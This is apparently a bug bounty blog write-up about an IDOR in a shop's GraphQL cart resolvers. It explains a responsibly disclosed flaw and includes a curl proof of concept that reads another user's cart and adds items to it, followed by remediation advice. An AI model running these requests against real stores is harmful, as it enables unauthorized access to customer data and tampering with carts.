---
layout: post
title: "Critical IDOR in GraphQL: From Nuclei Scan to Full Cart Takeover"
date: 2025-06-01 18:45:00
categories: [Cybersecurity, GraphQL, Bug Bounty]
tags: [idor, graphql, shopify, bug bounty, insecure direct object reference]
image:
  path: /assets/img/graphql-idor.png
  alt: "GraphQL IDOR diagram"
description: "How a single missing permission check allowed me to read and modify any customer cart on the target shop."
---

# Critical IDOR in the GraphQL Endpoint of **[redacted-domain]**

![Nuclei Scan](https://raw.githubusercontent.com/projectdiscovery/nuclei/master/docs/img/nuclei-logo.png "Nuclei Logo")

**Responsible disclosure:** This research was conducted for educational purposes. The findings were reported to the *[redacted-domain]* team prior to publication, and mitigations are already in place.

---

## Brief Introduction to GraphQL

GraphQL exposes all application resources through **a single HTTP endpoint**. The client sends text with a *query* or *mutation* specifying exactly which fields it needs, and each field is resolved by a function called a **resolver**.

* **Single endpoint** → if a permission check is missing in a resolver, anyone with access to the URL can directly invoke that logic.
* **Global IDs** → Shopify wraps each object in strings like `gid://…`; the backend must verify that the user providing the ID is its actual owner.
* **Cascading resolvers** → `cart(id: …)` calls the data layer without checking the session → knowing the ID is enough to read or modify the resource.

In this case, the `cart` resolver and its associated mutations **did not validate the owner** of the cart: they relied on the `gid` containing a "secret" key. This omission enabled the IDOR.

---

## 1 Why Look at GraphQL?

GraphQL exposes **an entire data model** under a single URL (`/api/graphql`). If resolvers fail to check permissions per resource, any client knowing the correct identifiers can read or modify foreign objects.

*In this case*, the cart resolvers (`cart`, `cartLinesAdd`, etc.) **never checked** who was requesting the operation: they relied solely on the global ID (`gid://shopify/Cart/...`) containing a "secret" key. This assumption led to an **IDOR** (Insecure Direct Object Reference) for both reading and writing.

---

## 2 Step-by-Step Methodology

| Step                     | Action                                                                                                                                             | Key Finding                                                                                 |
|--------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
| **Reconnaissance**       | Discovered `/api/graphql` by scanning common routes and performed an introspection (`__schema`).                                                    | The server returned the full schema: `Cart`, `cartCreate`, `cartLinesAdd`, etc. types.      |
| **Enumeration**          | Tested anonymous calls to `products(first:1)` and `cartCreate`.                                                                                    | Both worked without tokens. The service created anonymous carts and listed products.        |
| **Read Test**            | From “Session A,” created a cart (`cartCreate`) and saved its Global ID. From “Session B,” created another cart and copied its ID.                  | Session A could execute `cart(id:"<ID_B>")` and received the full object of the foreign cart. |
| **Write Test**           | Obtained two `ProductVariantID`s with `products { variants { id } }`. From “Session A,” called `cartLinesAdd` using the cart ID from “Session B.” | The mutation returned **OK** and added lines to the other user’s cart.                      |

*Below is a screenshot of the result of running Nuclei against `/api/graphql`:*

![Nuclei Scan Result](/assets/img/nuclei-scan-result.png "Nuclei Scan Results for GraphQL")

---

## 3 Proof-of-Concept (PoC) Summary

```bash
# Create cart B (victim)
CART_B=$(curl -s -X POST https://[redacted-domain]/api/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { cartCreate { cart { id } } }"}')
CART_B_ID=$(echo "$CART_B" | grep -oP '"id":"\\K[^" ]+')

# Obtain a public Variant ID
VARIANT_ID=$(curl -s -X POST https://[redacted-domain]/api/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ products(first:1) { edges { node { variants(first:1) { edges { node { id } } } } } } }"}' | \
  grep -oP '"id":"\\K[^" ]+' | head -n1)

# Add 2 units of that variant to the foreign cart (attacker session)
curl -s -X POST https://[redacted-domain]/api/graphql \
  -H 'Content-Type: application/json' \
  --data "{\"query\":\"mutation { cartLinesAdd(cartId:\\\"$CART_B_ID\\\", lines:[{merchandiseId:\\\"$VARIANT_ID\\\", quantity:2}]) { cart { id } } }\"}"

# Read the foreign cart with its new lines
curl -s -X POST https://[redacted-domain]/api/graphql \
  -H 'Content-Type: application/json' \
  --data "{\"query\":\"{ cart(id:\\\"$CART_B_ID\\\") { id lines(first:5) { edges { node { quantity merchandise { ... on ProductVariant { title } } } } } } }\"}"
```

The final response returns the newly added line, demonstrating unauthorized reading and writing.

---

## 4  Impact

* **Exposure of private data**: Anyone could spy on products, discounts, and quantities in any cart.
* **Inventory manipulation and fraud**: Items could be added/removed from third-party carts.
* **High severity**: A basic authorization vulnerability in a real shopping environment.

---

## 5  Proposed Remediation

1. **Owner check in resolvers**: Validate that `context.user` or the session cookie matches `cart.ownerId` before returning or mutating data.
2. **Signed tokens**: If a `key` is used in the Global ID, sign it (JWT/HMAC) so it cannot be guessed or reused.
3. **Global review**: Audit all resolvers (`Checkout`, `Order`, `Customer`) to prevent similar patterns.



**Takeaway**: In GraphQL, *everything* is resolved at a single endpoint; if you miss a permission check in a resolver, you open the door to your entire data domain.

---